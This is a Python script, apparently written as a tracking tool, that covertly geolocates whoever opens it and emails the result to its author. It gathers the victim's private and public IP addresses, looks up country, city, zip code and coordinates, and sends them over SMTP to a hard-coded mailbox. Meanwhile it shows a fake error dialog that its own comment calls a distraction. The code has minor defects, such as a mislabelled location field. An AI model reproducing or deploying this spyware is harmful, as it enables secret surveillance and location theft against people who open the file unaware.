#!/usr/bin/env python
""" A script to retrieve the geographical location from
IP address of person that opens file and sends email
to author.
"""


import os
import json
import socket
import smtplib
import pyautogui
import urllib.request
from requests import get
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


__author__ = "Brandon Bailey"
__copyright__ = "Copyright 2019, Brandon Bailey"
__credits__ = ["Brandon Bailey"]
__license__ = "GNU"
__version__ = "1.0.0"
__maintainer__ = "Brandon Bailey"
__email__ = ""
__status__ = "Production"


def get_ip_addres():
    """fun to retrieve external ip address of machine
    used to open file.
    :return: private_ip : private IP address of machine
    :return: ip : public IP address of machine"""

    public_ip = get("https://api.ipify.org").text

    private_ip = (([public_ip for public_ip in socket.gethostbyname_ex(socket.gethostname())[2] \
                    if not public_ip.startswith("127.")] \
                    or [[(this_socket.connect(("8.8.8.8", 53)), this_socket.getsockname()[0], this_socket.close()) \
                    for this_socket in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0]

    return private_ip, public_ip

def get_info(ip):
    """function to get geo location from external ip address.
    :param: ip : source IP address
    :return: data_result : resulting json data obtained"""

    api = "http://freegeoip.net/json/" + ip

    data_result = urllib.request.urlopen(api).read()
    data_result = str(data_result)
    data_result = data_result[2:len(data_result)-3]
    data_result = json.loads(data_result)

    return data_result

def send_mail(private_ip, result):
    """function to send mail of all info
    to source.
    :param: private_ip : IP address of target
    :param: result : json data"""

    username = #<#EMAIL#>
    password = #<#PASSWORD#>

    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(username, password)

    email = username

    msg = MIMEMultipart()

    msg['From'] = username
    msg['To'] = email
    msg['Subject'] = "You have a new ping!"

    msg_contents = "Private IP: {0} ; ".format(private_ip)
    msg_contents += "public IP: {0} ; ".format(result["ip"])
    msg_contents += "Country Name: {0} ; ".format(result["country_name"])
    msg_contents += "Country Code: {0} ; ".format(result["country_code"])
    msg_contents += "Region Name: {0} ; ".format(result["region_name"])
    msg_contents += "Region Code: {0} ; ".format(result["region_code"])
    msg_contents += "City: {0} ; ".format(result["city"])
    msg_contents += "Zip Code: {0} ; ".format(result["zip_code"])
    msg_contents += "Latitude: {0} ; ".format(result["latitude"])
    msg_contents += "Longitude: {0} ; ".format(result["longitude"])
    msg_contents += "Location link: {0} ; ".format(result["region_code"])

    msg_contents += "Location link: " + "http://www.openstreetmap.org/#map=11/" + str(result["latitude"]) +"/" + str(result["longitude"])

    msg.attach(MIMEText(msg_contents, 'plain'))

    server.send_message(msg)
    print('Success: Email sent.')

def display_distr():
    """displays window of distraction while script runs"""

    pyautogui.alert('ERROR. This application encountered an error. {0}'.format(os.getcwd()))


if __name__ == "__main__":

    private_ip, ip = get_ip_addres()
    result = get_info(ip)

    display_distr()

send_mail(private_ip, result)

